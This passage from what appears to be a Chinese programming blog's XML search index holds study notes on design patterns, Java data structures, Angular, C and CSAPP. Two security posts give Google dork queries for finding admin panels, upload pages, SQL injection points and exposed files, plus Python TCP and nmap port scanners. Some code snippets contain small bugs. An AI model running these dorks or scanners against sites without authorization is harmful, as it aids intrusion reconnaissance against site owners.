问题(Problem):描述应该在何时使用模式.解释了设计问题和问题存在的前因后果,可能还描述模式必须满足的先决条件. 解决方案(Solution):描述了设计的组成成分,相互关系及各自的职责和协作方式.解决方案并不描述一个具体的设计或实现,而是提供设计问题的抽象描述和解决问题所采用的元素组合(类和对象). 效果(consequences):描述模式的应用效果及使用模式应权衡的问题. 创建型设计模式概览工厂方法模式:父类负责定义创建对象的公共接口,而子类则负责生成具体对象,将类的实例化操作延迟到子类中完成. 抽象工厂模式:为一个产品族提供统一的创建接口.当需要这个产品族的某一系列的时候,可以从抽象工厂中选出相应的系列创建一个具体的工厂类. 单件(Singleton)模式:保证一个类有且仅有一个实例,提供一个全局访问点. 生成器(Builder)模式:将复杂对象创建与表示分离,同样的创建过程可创建不同的表示.允许用户通过指定复杂对象类型和内容来创建对象,用户不需要知道对象内部的具体构建细节. 原型(Prototype)模式:通过复制一个已经存在的实例来返回新的实例(不新建实例).被复制的实例就是原型,这个原型是可定制的.原型模式多用于创建复杂的或者耗时的实例,因为这种情况下,复制一个已经存在的实例使程序运行更高效;或者创建值相等,只是命名不一样的同类数据. 结构型设计模式概览组合(Composite)模式:定义一个接口,使之用于单一对象,也可以应用于多个单一对象组成的对象组. 装饰(Decorator)模式:给对象动态添加额外的职责,就好像给一个物体加上装饰物,完善其功能. 代理(Proxy)模式:在软件系统中,有些对象有时候由于跨越网络或者其他障碍,而不能够或者不想直接访问另一个对象,直接访问会给系统带来不必要的复杂性,这时候可以在客户程序和目标对象之间增加一层中间层,让代理对象来代替目标对象打点一切. 享元(Flyweight)模式:Flyweight是一个共享对象,它可以同时在不同上下文(Context)使用. 外观(Facade)模式:外观模式为子系统提供了一个更高层次,更简单的接口,从而降低了子系统的复杂度,使子系统更易于使用和管理.外观承担了子系统中类交互的责任. 桥梁(Bridge)模式:桥梁模式的用意是将问题的抽象和实现分离开来实现,通过用聚合代替继承来解决子类爆炸性增长的问题. 适配器(Adapter)模式:将一个类的接口适配成用户所期待的接口.一个适配器允许因为接口不兼容而不能在一起工作的类工作在一起,做法是将类自己的接口包装在一个已存在的类中. 行为型设计模式概览模版(Template)模式:定义了一个算法步骤,并允许子类为一个或多个步骤提供实现.子类在不改变算法架构的情况下,可重新定义算法中某些步骤. 观察者(Observer)模式:定义了对象之间一对多的依赖,当这个对象的状态发生改变的时候,多个对象会接受到通知,有机会做出反馈. 迭代子(Iterator)模式:提供一种方法顺序访问一个聚合对象中各个元素,而又不需暴露该对象的内部表示. 责任链(Chain of Responsibility)模式:很多对象由每一个对象对其下一个对象的引用而连接起来形成一条链.请求在这个链上传递,直到链上的某一个对象决定处理此请求.发出这个请求的客户端并不知道链上的哪一个对象最终处理这个请求,这使系统可以在不影响客户端的情况下动态的重新组织链和分配责任. 备忘录(Memento)模式:在不破坏封装性的前提下,捕获一个对象的内部状态,并在该对象之外保存这个状态.这样以后就可将该对象恢复到原先保存的状态. 命令(Command)模式:将请求及其参数封装成一个对象,作为命令发起者和接收者的中介,可以对这些请求排队或记录请求日志,以及支持可撤销操作. 状态(State)模式:允许一个对象在其内部状态改变的时候改变其行为,即不同的状态,不同的行为. 访问者(Visitor)模式:表示一个作用于某对象结构中的各元素的操作.可以在不改变各元素的类的前提下定义作用于这些元素的新操作. 解释器(Interpreter)模式:给定一个语言,定义它的文法的一种表示,并定义一个解释器,这个解释器使用该表示来解释语言中的句子. 中介者(Mediator)模式:用一个中介对象来封装一系列的对象交互. 策略(Strategy)模式:定义一组算法,将每个算法都封装起来,并且使它们之间可以互换.策略模式使这些算法在客户端调用它们的时候能够互不影响地变化. MVC类的模型/视图/控制器(Model/View/Controller)三元组.Model是应用对象,View是它在屏幕上的显示,Controller定义用户界面对用户输入的响应模式.使用了模式:观察者,组合,策略,工厂方法,装饰. 框架与结构框架是可实例化的,部分完成的软件系统或子系统,它为一组系统或子系统定义了统一的体系结构,并提供了系统的基本构造块,还为实现具体功能定义了扩展点.框架实现了体系结构级别的复用. 框架与模式从应用领域上分,框架给出的是整个应用的体系结构;而设计模式则给出了单一设计问题的解决方案. 从内容上分,设计模式仅是一个单纯的设计,这个设计可被不同语言以不同方式来实现;而框架则是设计和代码的混合体. 设计模式比框架更容易移植. 框架是软件,而设计模式是软件的知识体,设计模式的合理利用可以提升框架的设计水平.]]></content>
      <categories>
        <category>SE</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-algorithm-队列和栈]]></title>
    <url>%2Fposts%2F79b46b65%2F</url>
    <content type="text"><![CDATA[队列队列是FIFO(先进先出)的聚合类型. 需要实现创建一个空队列,添加一个元素到队尾,弹出队列首元素,返回队列长度和判断队列是否为空的基本功能. 可用于排队,优先级等. 栈栈是LIFO(后进先出)的聚合类型. 需要实现创建一个空栈,添加一个元素到栈顶,弹出栈顶,返回栈长度和判断栈是否为空的基本功能. 可用于表达式求值等. Java实现动态调整数组大小的下压(LOFO)栈. 123456789101112131415161718192021222324252627282930313233343536373839404142import java.util.Iterator;public class ResizingArrayStack&lt;Item&gt; implements Iterator&lt;Item&gt;//实现泛型和迭代&#123; private Item[] a = (Item[]) new Object[1]; private int N = 0; public boolean isEmpty() &#123; return N == 0; &#125; public int size() &#123; return N; &#125; private void resize(int max) &#123; Item[] temp = (Item[]) new Object[max]; for (int i = 0; i &lt; N; i++) &#123; temp[i] = a[i]; &#125; a = temp; &#125; public void push(Item item) &#123; if (N == a.length) resize(2 * a.length); a[N++] = item; &#125; public Item pop() &#123; Item item = a[--N]; a[N] = null; if (N &gt; 0 &amp;&amp; N == a.length / 4) resize(a.length / 2); return item; &#125; public Iterator&lt;Item&gt; iterator() &#123; return new ReverseArrayIterator(); &#125; private class ReverseArrayIterator implements Iterator&lt;Item&gt; &#123; private int i = N; public boolean hasNext() &#123; return i &gt; 0; &#125; public Item next() &#123; return a[--i]; &#125; public remove() &#123;&#125; &#125;&#125; 基于链表的先进先出(FIFO)队列. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import java.util.Iterator;public class Queue&lt;Item&gt; implements Iterator&lt;Item&gt;&#123; private Node first; private Node last; private int N; private class Node &#123; Item item; Node next; &#125; public boolean isEmpty() &#123; return first == null; &#125; public int size() &#123; return N; &#125; public void enqueue(Item item) &#123; Node oldlast = last; last = new Node(); last.item = item; last.next = null; if (isEmpty()) first = last; else oldlast.next = last; N++; &#125; public Item dequeue() &#123; Item item = first.item; first = first.next; if (isEmpty()) last = null; N--; return item; &#125; public Iterator&lt;Item&gt; iterator() &#123; return new ListIterator(); &#125; private class ListIterator implements Iterator&lt;Item&gt; &#123; private Node current = first; public boolean hasNext() &#123; return current != null; &#125; public void remove() &#123;&#125; public Item next() &#123; Item item = current.item; current = current.next; return item; &#125; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-FrontEnd-Angular-基础]]></title>
    <url>%2Fposts%2F93e690cb%2F</url>
    <content type="text"><![CDATA[概念Angular应用程序围绕MVC设计模式构建,是由Google赞助和维护的JavaScript开源库.通过将服务器端开发的一些方法用来增强浏览器端,为更简单的构建富应用程序打下基础. Angular应用程序通常采用TypeScript编写(TypeScript是JavaScript的超集). 开发环境node.js,angular-cli,chrome(或其他浏览器). 重要文件通过修改package.json文件中的dependencies字段然后npm install来安装对应软件包,或者直接npm install &lt;package name&gt;来安装软件包. package.json文件中的devDependencies用于指定开发过程用到的包,scripts用于定义用来编译,测试或运行的命令. 通过修改.angular-cli.json文件中的style字段来配置CSS文件. index.html就是整个Angular网页.Angular是单页面应用程序.还有引导文件project/src/main.ts. 模块与组件JavaScript模块用于管理项目中不同文件之间产生的依赖关系,使用模块时每个TypeScript或JavaScript文件被认为是一个独立的功能单元,并且使用export来表示要在其他单元使用的数据或类型. Angular通过模板来展示数据,即包含由Angular执行的指令的HTML片段.例如使用,Angular会对表达式expr求值. Angular组件负责管理模板并为其提供数据和业务逻辑.一个组件大致如下所示: 123456789101112import &#123; Component &#125; from "@angular/core";//...//装饰器,提供类的元数据.@Component(&#123; selector: "todo-app",//CSS选择器,相当于div这个标识符对于div元素 templateUrl: "app.component.html"//用于指定当前组件对应的模板 //...&#125;)export class AppComponent &#123; //...&#125; Angular模块和JavaScript模块是不一样的,Angular模块用于描述应用程序或一组相关功能,每个应用程序都有一个根模块,它为Angular提供启动应用程序的信息. 123456789import ...@NgModule(&#123; declarations: [AppComponent],//声明组件 imports: [...],//导入相应的模块 providers: [],//声明服务 bootstrap: [AppConponent]//指定用于启动应用程序的组件&#125;)export class AppModule &#123; &#125; 为了知道根模块,还需要一个引导文件project/src/main.ts. 1234567import ...if (environment.production) &#123;//产品环境下 enableProdMode();&#125;platformBrowserDynamic().bootstrapModule(AppModule) .catch(err =&gt; console.log(err)); Angular通过服务来分离那些多个组件复用的数据与业务逻辑. JavaScript模块Angular中的JavaScript模块可以使用插值表达式. 12&lt;h1&gt;Hello &#123;&#123;name&#125;&#125;&lt;/h1&gt;&lt;!-- name为对于组件里的变量 --&gt; 还可以使用事件绑定来触发对应组件内的函数. 1&lt;date-picker (dateChanged)="statement()"&gt;&lt;/date-picker&gt; 对于Http请求可以使用内置的HttpClientModule模块. 12345678910import &#123; HttpClientModule &#125; from '@angular/common/http';//...imports: [..., HttpModule],//...//...this.http.get&lt;Member[]&gt;(`https://api.github.com/orgs/angular/members? page=1&amp;per_page=5`).subscribe(data =&gt; &#123; if (data) this.members = data;&#125;); 指令Angular指令用于在模板中处理数据的展示.常用的有ngFor,ngIf等等.作为元素的属性使用. 123456789101112&lt;h2&gt;大家好，我是&#123;&#123;name&#125;&#125;&lt;/h2&gt;&lt;p&gt;我来自&lt;strong&gt;&#123;&#123;address.province&#125;&#125;&lt;/strong&gt;省, &lt;strong&gt;&#123;&#123;address.city&#125;&#125;&lt;/strong&gt;市&lt;/p&gt;&lt;div *ngIf="showSkills"&gt; &lt;h3&gt;我的技能&lt;/h3&gt; &lt;ul&gt; &lt;li *ngFor="let skill of skills"&gt; &#123;&#123;skill&#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 具体使用参考官方文档.开发资源. 路由首先通过Angular模块来配置路由信息. 12345678910111213141516import &#123; Routes, RouterModule &#125; from '@angular/router';import &#123; UserComponent &#125; from './user.component';export const ROUTES: Routes = [ &#123; path: 'user', component: UserComponent &#125;];@NgModule(&#123; imports: [ BrowserModule, RouterModule.forRoot(ROUTES) ], // ...&#125;)export class AppModule &#123;&#125; 然后可以通过多种方式进行路由. 1234&lt;a routerLink="/user"&gt;user&lt;/a&gt;&lt;!-- 路由到对应路径 --&gt;&lt;router-outlet&gt;&lt;/router-outlet&gt;&lt;!-- 根据url进行路由 --&gt;]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-IG-GoogleHacking]]></title>
    <url>%2Fposts%2Fbb7997e6%2F</url>
    <content type="text"><![CDATA[概念利用Google的特定语法来查找网站可能的敏感网页与漏洞. 基本Google Hacking语法一些操作符给关键词加上双引号实现精确搜索,不进行分词. 通配符是星号*,必须在精确搜索符双引号内部使用. 点号.匹配的是字符,不是字,短语等内容. Google和许多搜索引擎一样,多个词间的逻辑关系默认的是逻辑与(空格). 使用|进行逻辑或,使用-进行逻辑非,使用+进行强制搜索,(即必须包含加号后的内容). 用两个点号..表示一个数字范围. intext以网页的正文内容做为搜索条件,但只能接一个关键字. allintext和intext类似,能接多个关键字,能与其他操作符混用. intitle以网页的标题内容做为搜索条件,但只能接一个关键字. allintitle和intitle类似,能接多个关键字,不能与其他操作符混用. cache输入URL,搜索特定页面的缓存快照. define搜索输入关键词或关键词组的定义来源链接. filetype/ext搜索指定类型的文件. info输入URL,搜索其摘要和相关信息,不能与其他操作符及关键字混用. inurl搜索关键字是否存在于URL中.可以结合site指令来找后台,可以与其他操作符混用. allinurl类似inurl,但是可指定多个字符,不能与其他操作符混用,可单独使用. link搜索链接到所输入URL的页面,不需要关键字,不能与其他操作符及关键字混用. site将搜索范围缩小到特定的网站,域或子域. tips:不加www可以搜索到二级域名. related输入URL,搜索与该URL相关的页面,不能与其他操作符及关键字混用. numrange冒号后接数字范围,用-两边接数字来表示. inanchor搜索一个HTML标记中的一个链接文本. 组合使用找管理后台地址123site:xxx.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号site:xxx.com inurl:login/admin/manage/manager/admin_login/login_admin/system/boss/mastersite:xxx.com intitle:管理|后台|登陆| 找上传一类的漏洞12site:xxx.com inurl:filesite:xxx.com inurl:load 找注入点页面1site:xxx.com inurl:php?id= 找编辑器页面12site:xxxx.com inurl:fcksite:xxx.com inurl:ewebeditor 找特定文件123456site:xxx.com inurl:robots.txtsite:xxx.com filetype:mdbsite:xxx.com filetype:inisite:xxx.com inurl:txtsite:xxx.com filetype:phpsite:xxx.com filetype:asp]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>information-gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-C专家编程-笔记]]></title>
    <url>%2Fposts%2Fd72d39fe%2F</url>
    <content type="text"><![CDATA[tips参数的传递过程就是赋值,其约束条件也是如此. const关键字并不真正表示常量. 链接时-lthread等同于libthread.so. 预处理器C预处理器主要实现三个功能,字符串替换(#define str_a str_b),头文件包含(#include &lt;stdio.h&gt;)和宏扩展(#define a(y) a_do(y)). 未定义行为 整型数右移要不要扩展符号位. 参数求值的顺序. 优先级与结合性之外的计算顺序,包括表达式中函数求值顺序. 缺省可见性C语言函数定义时是缺省下全局可见的,这种大范围的全局可见与C语言另一个特性interpositioning相互影响,在C语言中一个符号要么全局可见,要么对其他文件都不可见. 容易误解的运算符优先性 .优先性高于*,所以*p.f相当于*(p.f)而不是(*p).f. []优先性高于*,所以int * ap[]声明的是一个数组,存储类型为int指针. 算术运算优先性高于移位运算. 逗号运算符优先级最低. maximal munch strategy这是一个编译策略,即如果下一个标记有超过一种的解释方案,编译器将选取最长字符序列的方案. 声明C中的声明包括至少一个类型说明符,有且只有一个的声明器(直接声明器,如name,name[N],name(arg,...)等),,连接的零个或更多声明器(指针),和零个或一个的初始化内容组成. 类型说明符包括存储类型(原生基础类型和聚合类型)和类型限定符(例如:auto,const等). 声明说明了其他地方创建的对象名称并允许使用.定义是一种特殊的声明,它还创建了一个对象. 优先级规则声明从标识符开始读取,然后按照优先级顺序读取. 声明中被括号括起来的那部分. 后缀操作符(),[]. 前缀操作符*. 如果const,volatile后面紧跟类型说明符,那么它作用于类型说明符.其他情况下作用于左边紧邻的指针星号. C名称空间C存在多种名称空间 标签名(goto). 标签(tag):用于所有的结构,枚举和联合. 成员名:每个结构或联合都有自己的名称空间. 其他. 例如:struct foo{ int foo; }foo;是合法的. 隐式转换对于大多数C语言的实现,处理同样字长的有符号数和无符号数之间相互转换的一般规则是:数值可能会变,但位模式不变.对于不同字长的数据类型之间的转换,C语言标准要求先转换大小再转换有无符号.对应的就可能会产生截断.所有比int小的整型计算时都会升级成int进行计算. 而当执行一个运算时,如果一个有符号一个无符号,C语言会隐式地将有符号数强制类型转换为无符号数. C语言中的移位运算和大小转换涉及到无符号扩展和符号扩展,还有对应的截断. 在C语言中当float和double转换成int时溢出会产生整数不确定值(在Intel兼容的微处理器中即0x10000...). 数组与指针C语言引入了可修改的左值这个术语,即允许出现在赋值语句的左边的左值. 12x = y;//x为左值,y为右值 左值在编译时可知,表示存储数据(结果)的地址.而对应的右值表示存储的数据内容.数组名是左值但不是可修改的左值. 当一个数组名出现在一个表达式时,它会被转换为一个指向该数组第一个元素的指针.C语言将数组下标作为指针的偏移量.作为函数参数的数组名等同于指针. 编译器为每个变量分配一个地址(左值),而这个变量的内容(右值)是运行时才可知的. 数组名并不是指针,其使用过程并不相同. 12char a[5] = "1234";a[3]; 这里对a[3]的访问过程为: 从符号表获得变量数组a的地址(左值),加上3. 取结果地址的内容(右值). 12char * a = "1234";a[3]; 这里对a[3]的访问过程为: 从符号表获得变量指针a的地址(左值),获取其内容(右值,指向字符串). 将获取内容与3相加,去结果地址内容(右值). 前者直接访问数据,后者要通过指针内容(地址)间接访问. 运行时数据结构段,heap,stack,libc等. 全局的goto与标签–setjmp与longjmp. 指定初始化源于ISO C99标准. 1234567891011static struct usb_driver usb_storage_driver = &#123; .owner = THIS_MODULE, .name = "usb-storage", .probe = storage_probe, .disconnect = storage_disconnect, .id_table = storage_usb_ids,&#125;;int a[6] = &#123;[4] = 29, [2] = 15&#125;;int widths[] = &#123;[0 ... 9] = 1, [10 ... 99] = 2, [100] = 3&#125;;//GNU扩展]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-java-基础]]></title>
    <url>%2Fposts%2F5d6cc46%2F</url>
    <content type="text"><![CDATA[一个简单的Java应用程序1234567public class Sample &#123; //类名以大写字母开头 public static void main(String[] args) &#123; System.out.println("233"); //我是一个注释 &#125;&#125; 运行. 1234javac Sample.java#注意文件名一定要与公共类名一致,且一个源文件中只能有一个公共类java Sample#调用Sample类的main方法,也可以调用该文件中其他类的main方法 简单分析public为访问修饰符,表示对所有类可见,使用对象为类,接口,变量,方法. class用于声明一个类,在Java中类是程序内容的唯一容器(面向对象编程),类名首字母必须大写.源代码文件名必须与公共类的名字相同,且一个源文件中只能有一个公有类. static表示方法为静态方法,静态方法只能访问静态成员,而实例方法可以访问静态和实例成员.void表示该方法无返回值. 在Java中main方法必须声明为public static void main(String[]),String[]中就是命令行参数(与C和C++不一样的是其中不包括程序名). 注释Java中有三种注释方式. //用于注释一行,作用域其后的字符. /*和*/注释其之间的所有字符,不能嵌套. /**和*/可以用来自动生成文档. 12345//第一种/* 第二种 *//** * 第三种 */ 数据类型4种整型类型:long,int,short,byte.分别为8,4,2,1个字节. 而整数字面量有长整型数值4000L;十六进制数值0x16,0XAA;八进制数值010;二进制数0b101,0B100;还可以加下划线1_000_000,其中下划线会被Java编译器忽略;和普通的233; 其中和C和C++不一样的是Java整型类型的大小与平台无关,且没有无符号整型.但Java用&gt;&gt;代表算术右移运算,&gt;&gt;&gt;代表逻辑右移运算. 2种浮点类型:float,double.分别为4,8个字节.前者有效位数为6~7位,后者为15位. 浮点字面量有float的3.1F,3.2f;double的3.1D,3.2d,4.0. 整型上溢和下溢会产生类似时钟的结果,而浮点数溢出或者出错会产生正无穷大,负无穷大和NaN,其中NaN不是唯一的.判断结果是否为NaN不能使用x == Double.NaN,而是使用Double.isNaN(x);整数除以0会产生异常,而浮点数会得到无穷大或者NaN. char类型原本用于表示单个字符,由于字符集的扩展和Unicode编码机制有些字符需要两个char值,一般不使用char类型. boolean类型有两个值:true和false,用于判断逻辑条件,与C和C++不一样的是Java种布尔值不等同于整型值,比如if(0){}无法通过编译. 还有枚举类型,字符串.Java没有内置的字符串类型,而是在标准库提供了String,每个用双引号括起来的字符串都是String类的一个实例. 变量每一个变量都有自己的类型和值,Java不区分变量的声明和定义(C和C++区分). Java中使用final关键字指示常量(类似C和C++中的const,表示只能初始化一次,在Java中const是保留的关键字). 运算符关于%运算,Java同C和C++有同一个结果,就是余数与被除数同号. 而变量计算时的隐式类型转换同有符号数的C和C++(Java)没有无符号整数.tips:不要对boolean类型进行强制类型转换. Java关于移位运算有一个专门的&gt;&gt;&gt;代表逻辑右移(自然&gt;&gt;就是算术右移).其他的与C和C++基本相同. Java不使用逗号运算符,不过可以在for的第一和第三部分使用逗号,分隔表达式列表. String类对象是不可变字符串,编译器让字符串共享,这符合设计模式中的享元模式. Java中的对象和C和C++中的引用类似.String类变量实际在引用一个String类实例(就像指针),Java不保证所有一个字符串只存在一个被共享,所以检测一个字符串是否相等应该使用equals.而不是使用==(因为这是在比较引用的对象是否是一个). Java中null和空串是不同的,前者表示引用为空,后者表示引用的对象是空串. Java对数组的声明和对象类似,需要new来创建数组,数字数组元素初始化为0,boolean数组元素初始化为false,对象数组元素初始化为null(Java中运行数组长度为0).如果使用{1,2,3}来初始化数组对象则不需要显示的使用new. 同时Java的数组变量也是引用,且可以赋值. Java数组与C和C++分配在堆上的数组指针基本一样.同理double [][] a = new double[6][10]声明的是一个包含6个指针的数组,而a是指向它的指针(实际上Java并没有提供对指针的操作,也没有指针这个概念). 基础输入输出标准输出可以使用System.out对象的方法实现,而读取标准输入需要先构造一个Scanner对象并与System.in关联. 1Scanner in = new Scanner(System.in); 然后调用相应方法即可.Scanner类定义在java.util包中. 读写文件需要借助类. 12Scanner in = new Scanner("1.txt", "UTF-8");PrintWriter out = new PrintWriter("1.txt", "UTF-8") 面向过程编程Java控制流程的结构与C和C++基本一样,但Java没有goto语句,用于替代跳出多重循环的是带标签的break和带标签的continue(只能跳出,不能跳入). 另外还有一个类似C#中foreach循环的for循环,也叫for each循环. 1for(type arg:args) &#123;&#125; Java中有块作用域(与C和C++不一样,Java不允许嵌套定义),即一个变量的生命周期和可见范围为声明到当前块结束.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-IG-端口扫描器]]></title>
    <url>%2Fposts%2F12382ca0%2F</url>
    <content type="text"><![CDATA[一个简单的Demo环境:python3.7. 原理:由于大多数互联网应用使用的都是TCP协议,可以使用python提供的BSD套接字的接口(socket)来对指定端口进行TCP全连接扫描. 命令行的解析使用optparse,然后使用threading来进行线程扫描增加效率.最后使用一个信号量来控制不同线程对IO的操作. 建立socket套接字socket(int,int,int)能在kernel中创建一个socket并返回对应的描述符(即操作对象). 1int socket(int domain, int type, int protocol); domain. AF_UNIX/AF_LOCAL:用于本地程序的交互. AF_INET,AF_INET6:分别为基于IPv4和IPv6的网络交互. type. SOCK_STREAM:基于TCP. SOCK_DGRAM:基于UDP. Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import optparsefrom socket import *from threading import *screenLock = Semaphore(value = 1)def connScan(host, port): try: connSocket = socket(AF_INET, SOCK_STREAM) #建立基于IPv4的TCP连接套接字 connSocket.connect((host, post)) #连接 connSocket.send('ViolentPython\r\n') results = connSocket.recv(100) screenLock.acquire() #信号量 print('[+]%d/tcp open' % port) print('[+] ' + str(results)) except: screenLock.acquire() #锁住 print('[-]%d/tcp closed' % port) finally: screenLock.release() #释放 connSocket.close()def portScan(host, ports): try: ip = gethostbyname(host) except: print('[-] Cannot resolve "%s": Unknown host' % host) return try: name = gethostbyaddr(ip) print('\n[+] Scan Results for: ' + name[0]) except: print('\n[+] Scan Results for: ' + ip) setdefaulttimeout(1) for port in ports: t = Thread(target=connScan, args=(host, int(port))) #新建任务线程 t.start()def main(): parser = optparse.OptionParser('usage%prog H &lt;target host&gt; -p &lt;target port&gt;') parser.add_option('-H', dest='host', type='string', help='host') parser.add_option('-p', dest='port', type='string', help='port') (options, args) = parser.parse_args() host = options.host ports = str(options.port).split(',') if (host == None) | (ports[0] == None): print(parser.usage) exit(0) portScan(host,ports)if __name__ == "__main__": main() 使用Nmap进行端口扫描环境:python3.7,python-nmap. 原理:使用python-nmap在脚本中使用Nmap的全部功能,以此来进行其他端口扫描方法:TCP SYN SCAN,TCP NULL SCAN等. 1234567891011121314151617181920212223242526import nmapimport optparsefrom threading import *def nmapScan(host, port): nmScan = nmap.PortScanner() nmScan.scan(host, port) state = nmScan[host]['tcp'][int(port)]['state'] print('[*] ' + host + ' tcp/' + port + ' ' + state)def main(): parser = optparse.OptionParser('usage%prog H &lt;target host&gt; -p &lt;target port&gt;') parser.add_option('-H', dest='host', type='string', help='host') parser.add_option('-p', dest='port', type='string', help='port') (options, args) = parser.parse_args() host = options.host ports = str(options.port).split(',') if (host == None) | (ports[0] == None): print(parser.usage) exit(0) for port in ports: t = Thread(target=nmapScan, args=(host, port)) t.start()if __name__ == "__main__": main()]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>information-gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-CSAPP-程序的机器级表示]]></title>
    <url>%2Fposts%2F996a715f%2F</url>
    <content type="text"><![CDATA[机器代码计算机硬件只能识别和运行机器语言程序,通常都是先将高级语言源程序通过编译器转换为汇编语言目标程序,然后将汇编语言源程序通过汇编器转换为机器语言目标程序. 一条机器代码由若干字段组成,典型的是操作码字段加操作数字段,这些机器代码是不等长的比特序列,为了方便编程便有了对应的汇编代码. 汇编代码是机器代码的文本表示.而机器代码是与机器(具体来说是cpu)相关的,为了编程的效率就有了具有可移植性的高级语言. 也就说通常编程使用的源代码会先编译成汇编代码然后被汇编为机器代码,最后由cpu执行,这之中实际上是三次转换(编码). Intel处理器的演变从第一代单芯片,16bit微处理器之一的8086,和其后继8087(建立了x86系列的浮点模型),8088(拓展了一个8bit外部总线).到被淘汰的多寻址模式处理器80286.再到后面将体系结构拓展到32bit并增加平坦寻址模式的i386(这是Intel系列第一个全面支持Unix的机器),后继i486(集成了浮点单元).和后面的Pentium系列和现在的Core系列.对应的微指令在不断变化,对应的机器代码也在不断更迭. 两个重要的抽象计算机系统使用了很多抽象帮助不同层面的人更效率的工作,每一个抽象层都是对其上下层隐藏实现细节. 对于机器级编程来说有两种非常重要的抽象,ISA(指令集体系结构)和虚拟地址. 前者定义了机器级程序的格式和行为,定义了处理器状态,指令的格式和每条指令的作用.主要如下: 可执行的指令的集合和其对应的可接受的操作数类型. 操作数所能存放的寄存器组结构及其具体用途等. 操作数在存储空间的存放方式为大端或是小端. 指令执行过程的控制方式. 后者通过将DRAM,flash,磁盘存储器,特殊硬件和操作系统软件结合,所有使用的存储设备的存储单元被抽象成一个虚拟地址空间供程序使用,就像一个字节数组. 机器代码中有一些在C里面隐藏的东西,比如处理器的状态. 生成机器代码一个C源程序到可执行文件要经过预处理,编译获得汇编语言源程序,汇编获得机器语言目标代码文件,链接获得可执行文件. 12345678910111213141516&gt; gcc -Og -E test.c#-O&lt;n&gt;指示优化等级,-Og告诉编译器使用生成符合原始C代码结构的优化等级.#-E产生预处理后的文件.&gt; gcc -Og -S -masm=intel test.c#-S要求产生汇编代码,汇编代码也是文本,可读.#-masm=intel指定产生Intel格式汇编代码.&gt; gcc -Og -c test.c#-c产生目标代码文件,机器代码不是文本.&gt; file test.o#判断文件类型,输出:test.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped.&gt; gcc -Og -o test test.c#-o指定输出文件的文件名.#不加其他参数情况下产生可执行文件.&gt; objdump -d test.o#-d反汇编其text段,反汇编器得出的汇编代码为AT&amp;T格式,是GCC,OBJDUMP等工具的默认格式,另一常见的是Intel格式.#两者最大的区别为源操作数与目的操作数位置相反.例如Intel中mov目的在左,源在右.而ATT中正好相反. tips:b表示字节,w表示字,l表示双字,q表示四字. 扩展阅读pl-assembly-IA32-基础.]]></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-CSAPP-位的解析]]></title>
    <url>%2Fposts%2Fa372efa1%2F</url>
    <content type="text"><![CDATA[信息就是位+上下文 系统中所有的信息,包括磁盘文件,内存中的程序和用户存放的数据(进程)和网络上传输的数据都是由一串比特表示的.区别不同数据对象的就是读到这些数据对象时的上下文. 单独的位是没用的(只能区分两种情况),所以需要将这些位组合起来并加上对应的解析规则,就如微观世界的原子对于宏观世界的物体,基础门电路对于集成电路一样根据不同的排列组合产生不同的结果. 信息的存储从最开始的带孔纸带,到后来的晶体管,一直到现在集成电路.虽然存储的都是01信息(比特位),但设备的大小,读写速度都在不断进步. 通过将DRAM,flash,磁盘存储器,特殊硬件和操作系统软件结合,所有使用的存储设备的存储单元被抽象成一个虚拟地址空间供程序使用,就像一个字节数组. 而应用层的程序使用的就是这个被抽象出来的虚拟空间. 大多数计算机都以8位的字节(块)为最小可寻址内存单位(即一个存储单元),以位为最小操作单位.每一个存储单元有一个唯一的地址,也就对应的一个唯一的指针. 每台计算机都有一个字长,即指针的大小,这也限制了这台计算机的寻址空间.例如现在常见的32位和64位的计算机. 对象对于一个对象,有两个必需的属性:对象的地址和对象的类型. 对象的地址就是对应的指针.用于索引到对应的存储单元. 对象的类型决定了对象对应的解析规则(编码方式),换句话来说就是信息的编码与解码. 在几乎所有计算机上对象的地址位所使用字节(存储单元)中地址最小的一个的地址. 计算机的字节顺序分为大端法(IBM和Oracle的大多数机器)和小端法(大多数Intel兼容机).许多新型的微处理器使用双端法,即可自主设置. 大端法的最低有效字节在最前面,而小端法与之相反.(小端法更接近人类的思维,高位的值位权高). 按照对象的地址和计算机对应字节顺序获得原始数据后即可按照对象的类型对应的解析规则(编码方式)获得其真实含义. 编码方式计算机里面三种最重要的数字表示 无符号编码:基于传统二进制,表示非负整数. 补码编码:基于补码,表示全体整数. 浮点数编码:用于表示实数的科学记数法的以2为基数的版本,将信息分段保存. 溢出无论何种解析规则,一个n比特的数据结构可以映射2^n种情况.所以无法对整数,实数等达到满射.对于需要表达的数超出范围的情况,其结果是溢出,不同的编码方式对溢出的处理不同 整数的表示现在大多数计算机的整型数据结构大多小于8个字节,也就是64个比特,也就是最多对应2^64个整数.这其中又包括有符号数和无符号数这两大类. 对于无符号数就是将解析结果(比特流)直接当作一个二进制数使用,而对于有符号数绝大多数机器将其当做补码使用.(tips:补码,原码和反码) 整数的运算一个n比特的整数类型最多对应2^n个整数. 由于计算机执行得整数运算实际上是一种模运算的形式.所以运算时出现上溢或下溢后会像老式钟表一样产生11 -&gt; 